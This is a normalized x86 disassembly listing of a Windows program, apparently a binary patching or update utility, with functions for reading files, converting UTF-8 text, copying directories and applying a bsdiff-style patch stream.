mov ecx [ ebp + 0x8 ]
call sub_405250
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
sub_405bd0
push ebp
mov ebp esp
sub esp 0x6c
push r--data
mov eax [ ebp + 0x8 ]
push eax
call sub_412b5e
add esp 0x8
push eax
lea ecx [ ebp - 0x34 ]
call sub_402750
lea ecx [ ebp - 0x34 ]
call sub_4027d0
test eax eax
jne r-xdata
lea edx [ ebp - 0x30 ]
push edx
lea ecx [ ebp - 0x34 ]
call sub_4027d0
push eax
call sub_41b3c1
add esp 0x4
push eax
call sub_402140
add esp 0x8
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov [ ebp - 0x54 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_402770
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
push ecx
call sub_412584
add esp 0x4
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov [ ebp - 0x58 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_402770
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x5c ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_402770
mov eax [ ebp - 0x5c ]
jmp r-xdata
mov edx [ ebp - 0x3c ]
add edx [ ebp - 0x1c ]
mov [ edx ] 0x0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x1c ]
lea edx [ ecx + ecx + 0x2 ]
push edx
call sub_412584
add esp 0x4
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
push 0x7fffffff
call sub_4021c0
add esp 0x8
mov [ ebp - 0x4c ] eax
lea ecx [ ebp - 0x34 ]
call sub_4027d0
push eax
mov edx [ ebp - 0x4c ]
push edx
push 0x1
mov eax [ ebp - 0x44 ]
push eax
call sub_412518
add esp 0x10
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x50 ]
cmp ecx [ ebp - 0x4c ]
je r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
push eax
mov ecx [ ebp - 0x38 ]
push ecx
push 0xffffffff
mov edx [ ebp - 0x44 ]
push edx
push 0x8
push 0xfde9
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x64 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_402770
mov eax [ ebp - 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x44 ]
add ecx [ ebp - 0x50 ]
mov [ ebp - 0x44 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov [ ebp - 0x60 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_402770
mov eax [ ebp - 0x60 ]
jmp r-xdata
mov edx [ ebp - 0x3c ]
push edx
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x6c ] eax
lea ecx [ ebp - 0x34 ]
call sub_402770
mov eax [ ebp - 0x6c ]
call [ GetLastError@IAT ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax [ ebp - 0x3c ]
push eax
call sub_4121b5
add esp 0x4
mov ecx [ ebp - 0x38 ]
push ecx
call sub_4121b5
add esp 0x4
mov [ ebp - 0x68 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_402770
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
sub_405e10
push ebp
mov ebp esp
sub esp 0x294
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x218 ]
push ecx
call sub_401540
add esp 0x10
lea edx [ ebp - 0x218 ]
push edx
push r--data
mov ecx rw-data
call sub_407690
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0x0
je r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
call sub_405bd0
add esp 0x4
mov [ ebp - 0x22c ] eax
cmp [ ebp - 0x22c ] 0x0
jne r-xdata
lea eax [ ebp - 0x218 ]
push eax
push r--data
mov ecx rw-data
call sub_407690
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0x0
je r-xdata
lea ecx [ ebp - 0x224 ]
call sub_406650
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x218 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x6
jmp r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov eax [ ebp - 0x228 ]
jmp r-xdata
lea ecx [ ebp - 0x224 ]
call sub_4052a0
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
cmp edx 0x23
jne r-xdata
mov ecx [ ebp - 0xc ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x224 ]
call sub_405340
mov [ ebp - 0x228 ] eax
mov eax [ ebp - 0x228 ]
push eax
lea ecx [ ebp - 0x224 ]
call sub_405400
mov ecx [ ebp - 0x228 ]
mov [ ebp - 0x27c ] ecx
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x27c ]
mov edx [ ebp - 0x228 ]
mov [ ebp - 0x278 ] edx
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x278 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x230 ] eax
cmp [ ebp - 0x230 ] 0x0
jne r-xdata
jmp r-xdata
movzx ecx [ ebp - 0x5 ]
test ecx ecx
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov [ ebp - 0x240 ] 0x5
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x240 ]
jmp r-xdata
lea eax [ ebp - 0x22c ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x234 ] 0x0
push r--data
mov edx [ ebp - 0x230 ]
push edx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push r--data
mov edx [ ebp - 0x230 ]
push edx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push r--data
mov ecx [ ebp - 0x230 ]
push ecx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push 0x14
call sub_412ddb
add esp 0x4
mov [ ebp - 0x248 ] eax
cmp [ ebp - 0x248 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x238 ] eax
mov ecx [ ebp - 0x238 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push r--data
mov edx [ ebp - 0x238 ]
push edx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push r--data
mov eax [ ebp - 0x230 ]
push eax
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push 0x14
call sub_412ddb
add esp 0x4
mov [ ebp - 0x24c ] eax
cmp [ ebp - 0x24c ] 0x0
je r-xdata
mov [ ebp - 0x280 ] 0x0
mov ecx [ ebp - 0x248 ]
call sub_405920
mov [ ebp - 0x280 ] eax
jmp r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x224 ]
push eax
call sub_405a20
add esp 0x4
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0x0
je r-xdata
push r--data
mov eax [ ebp - 0x230 ]
push eax
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x23c ] eax
cmp [ ebp - 0x23c ] 0x0
jne r-xdata
mov [ ebp - 0x284 ] 0x0
mov ecx [ ebp - 0x24c ]
call sub_405990
mov [ ebp - 0x284 ] eax
jmp r-xdata
cmp [ ebp - 0x234 ] 0x0
jne r-xdata
mov eax [ ebp - 0x280 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
mov ecx [ ebp - 0x228 ]
mov [ ebp - 0x244 ] ecx
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x244 ]
jmp r-xdata
push r--data
mov edx [ ebp - 0x230 ]
push edx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push 0x14
call sub_412ddb
add esp 0x4
mov [ ebp - 0x25c ] eax
cmp [ ebp - 0x25c ] 0x0
je r-xdata
mov edx [ ebp - 0x23c ]
push edx
call sub_411794
add esp 0x4
mov ecx [ ebp - 0x23c ]
movzx edx [ ecx + eax * 2 - 0x2 ]
cmp edx 0x2f
je r-xdata
mov [ ebp - 0x250 ] 0x5
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x250 ]
jmp r-xdata
mov edx [ ebp - 0x284 ]
mov [ ebp - 0x234 ] edx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x234 ]
mov eax [ edx ]
mov ecx [ ebp - 0x234 ]
mov edx [ eax + 0x4 ]
call edx
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0x0
je r-xdata
mov [ ebp - 0x270 ] 0xf
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x270 ]
jmp r-xdata
push r--data
mov ecx [ ebp - 0x230 ]
push ecx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push 0x244
call sub_412ddb
add esp 0x4
mov [ ebp - 0x260 ] eax
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov [ ebp - 0x288 ] 0x0
mov ecx [ ebp - 0x25c ]
call sub_4064e0
mov [ ebp - 0x288 ] eax
jmp r-xdata
lea eax [ ebp - 0x224 ]
push eax
mov ecx [ ebp - 0x23c ]
push ecx
call sub_405490
add esp 0x8
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0x0
je r-xdata
mov [ ebp - 0x254 ] 0x5
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x254 ]
jmp r-xdata
mov ecx [ ebp - 0x234 ]
push ecx
lea ecx [ ebp - 0x224 ]
call sub_405250
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov [ ebp - 0x274 ] eax
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x274 ]
jmp r-xdata
push r--data
mov eax [ ebp - 0x230 ]
push eax
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push 0x18
call sub_412ddb
add esp 0x4
mov [ ebp - 0x264 ] eax
cmp [ ebp - 0x264 ] 0x0
je r-xdata
mov [ ebp - 0x28c ] 0x0
mov ecx [ ebp - 0x260 ]
call sub_406510
mov [ ebp - 0x28c ] eax
jmp r-xdata
mov ecx [ ebp - 0x288 ]
mov [ ebp - 0x234 ] ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x228 ]
mov [ ebp - 0x258 ] edx
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x258 ]
jmp r-xdata
push r--data
mov edx [ ebp - 0x230 ]
push edx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push 0x248
call sub_412ddb
add esp 0x4
mov [ ebp - 0x268 ] eax
cmp [ ebp - 0x268 ] 0x0
je r-xdata
mov [ ebp - 0x290 ] 0x0
mov ecx [ ebp - 0x264 ]
call sub_406550
mov [ ebp - 0x290 ] eax
jmp r-xdata
mov eax [ ebp - 0x28c ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
mov eax [ ebp - 0x230 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov [ ebp - 0x26c ] 0x5
lea ecx [ ebp - 0x224 ]
call sub_4051f0
mov eax [ ebp - 0x26c ]
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x294 ] 0x0
mov ecx [ ebp - 0x268 ]
call sub_4065d0
mov [ ebp - 0x294 ] eax
jmp r-xdata
mov edx [ ebp - 0x290 ]
mov [ ebp - 0x234 ] edx
jmp r-xdata
mov ecx [ ebp - 0x294 ]
mov [ ebp - 0x234 ] ecx
jmp r-xdata
sub_4064e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_405960
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406510
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_405960
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0xffffffff
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406550
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4064e0
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406580
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4065b0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_41226d
add esp 0x4
sub_4065d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_406510
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x244 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406600
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_406630
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_41226d
add esp 0x4
sub_406650
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406680
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push r--data
push 0x104
mov edx [ ebp + 0x8 ]
imul edx edx 0x208
add edx [ ebp - 0x4 ]
push edx
call sub_401540
add esp 0x14
mov esp ebp
pop ebp
retn 0xc
sub_4066c0
push ebp
mov ebp esp
push ecx
push rw-data
push r--data
push 0x104
mov eax [ ebp + 0x8 ]
push eax
call sub_401540
add esp 0x10
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
push 0x5c
mov eax [ ebp + 0x8 ]
push eax
call sub_404520
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx edx [ rw-data ]
test edx edx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x2 ]
test edx edx
jne r-xdata
mov al 0x1
jmp r-xdata
xor al al
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] ax
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] ax
push 0x5c
mov edx [ ebp + 0x8 ]
push edx
call sub_404520
add esp 0x8
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
mov al 0x1
sub_406750
push ebp
mov ebp esp
sub esp 0x450
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_411b05
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
movzx edx [ ebp - 0x2a ]
and edx 0xf000
cmp edx 0x4000
je r-xdata
call sub_4119bb
mov edx [ eax ]
push edx
mov eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
mov eax 0x6
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_412153
add esp 0x4
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jge r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406940
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0x40 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_4081c0
add esp 0x4
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
call sub_4119bb
cmp [ eax ] 0x11
je r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_408270
add esp 0x4
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
call sub_4119bb
mov ecx [ eax ]
push ecx
mov edx [ ebp - 0x34 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
mov eax 0x6
jmp r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
mov eax 0x7
jmp r-xdata
mov eax [ ebp - 0x34 ]
push r--data
mov edx [ ebp - 0x38 ]
push edx
call sub_412c84
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
push r--data
mov eax [ ebp - 0x38 ]
push eax
call sub_412c84
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x38 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
push 0x104
lea eax [ ebp - 0x248 ]
push eax
call sub_401540
add esp 0x14
lea ecx [ ebp - 0x248 ]
push ecx
mov ecx [ ebp + 0x10 ]
call sub_4069a0
movzx edx al
test edx edx
je r-xdata
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push r--data
push 0x104
lea edx [ ebp - 0x450 ]
push edx
call sub_401540
add esp 0x14
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x450 ]
push ecx
lea edx [ ebp - 0x248 ]
push edx
call sub_406750
add esp 0xc
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
sub_406940
push ebp
mov ebp esp
push ecx
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ CopyFileW@IAT ]
test eax eax
setne dl
mov [ ebp - 0x1 ] dl
movzx eax [ ebp - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
mov eax 0x7
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4069a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jae r-xdata
xor al al
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0x208
add edx [ ebp - 0x8 ]
push edx
call sub_421346
add esp 0x8
test eax eax
jne r-xdata
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn 0x4
sub_406a50
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
push eax
push 0x20
push 0x1
mov ecx [ ebp + 0xc ]
push ecx
call sub_412518
add esp 0x10
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x20
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0xc ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0xc ] eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x10 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x18 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x1c ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x1c ] eax
lea edx [ ebp - 0x30 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41b3c1
add esp 0x4
push eax
call sub_402140
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov eax 0x6
jmp r-xdata
push 0x8
push r--data
mov ecx [ ebp + 0xc ]
push ecx
call sub_413ec7
add esp 0xc
test eax eax
je r-xdata
mov eax 0x6
jmp r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x18 ]
lea eax [ eax + edx + 0x20 ]
mov ecx [ ebp + 0xc ]
add eax [ ecx + 0x1c ]
cmp eax [ ebp - 0x1c ]
je r-xdata
mov eax 0x29
jmp r-xdata
xor eax eax
mov eax 0x29
jmp r-xdata
sub_406b60
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
add ecx [ eax + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x18 ]
mov edx [ ebp + 0x8 ]
add eax [ edx + 0x1c ]
push eax
call sub_412584
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x18 ]
mov eax [ ebp + 0x8 ]
add ecx [ eax + 0x1c ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] ecx
mov eax 0xc
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax [ edx + 0x14 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x30 ]
add edx [ ecx + 0x18 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
add eax [ edx + 0x1c ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x10 ] 0x7fffffff
jbe r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x29
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x30 ]
add edx [ ecx ]
cmp edx [ ebp - 0x34 ]
jbe r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x3c ] 0x7fffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x38 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
push 0x1
mov eax [ ebp - 0xc ]
push eax
call sub_412518
add esp 0x10
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x38 ]
cmp edx [ ecx ]
jae r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push ecx
push 0x1
mov edx [ ebp - 0x30 ]
push edx
call sub_413b0e
add esp 0x10
mov ecx [ ebp - 0x24 ]
cmp eax [ ecx ]
je r-xdata
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x38 ]
movzx ecx [ eax ]
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x38 ]
movzx eax [ edx ]
add eax ecx
mov ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x38 ]
mov [ ecx ] al
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x10 ]
add eax [ edx ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x30 ]
add edx [ ecx ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x28 ]
add ecx [ eax + 0x4 ]
cmp ecx [ ebp - 0x20 ]
jbe r-xdata
mov [ ebp - 0x8 ] 0x7
jmp r-xdata
mov eax [ ebp - 0x38 ]
add eax 0x1
mov [ ebp - 0x38 ] eax
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x4 ]
push ecx
push 0x1
mov edx [ ebp - 0x28 ]
push edx
call sub_413b0e
add esp 0x10
mov ecx [ ebp - 0x24 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
mov [ ebp - 0x8 ] 0x29
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
add eax [ edx + 0x4 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp + 0x10 ]
add edx [ ecx + 0x8 ]
cmp edx [ ebp - 0x14 ]
jbe r-xdata
mov [ ebp - 0x8 ] 0x7
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x10 ]
add ecx [ eax + 0x8 ]
mov [ ebp + 0x10 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0xc
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x2c ]
jb r-xdata
mov [ ebp - 0x8 ] 0x29
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] eax
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x4 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x8 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x10 ]
add eax [ edx ]
cmp eax [ ebp - 0x14 ]
ja r-xdata
sub_406df0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jge r-xdata
